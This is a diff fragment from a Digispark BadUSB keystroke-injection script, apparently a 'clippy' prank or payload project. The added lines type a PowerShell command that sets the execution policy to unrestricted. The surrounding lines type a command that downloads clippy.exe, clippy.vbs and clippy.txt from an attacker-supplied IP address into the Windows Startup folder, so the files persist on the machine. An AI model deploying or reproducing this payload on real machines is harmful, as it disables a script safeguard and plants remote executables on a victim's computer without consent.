@@ -58,6 +58,10 @@ Please see "clippy.txt" for list of phrases.
       DigiKeyboard.delay(100);
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
+      DigiKeyboard.print("set-executionpolicy unrestricted");
+      DigiKeyboard.delay(500);
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.delay(100);
       // Execute code from the interwebs
       // Modify 000.0.0.0 with your IP address
       DigiKeyboard.print("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;mkdir clippy;cd clippy;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\";Invoke-WebRequest \"http://000.0.0.0/clippy.vbs\" -OutFile \"clippy.vbs\"");
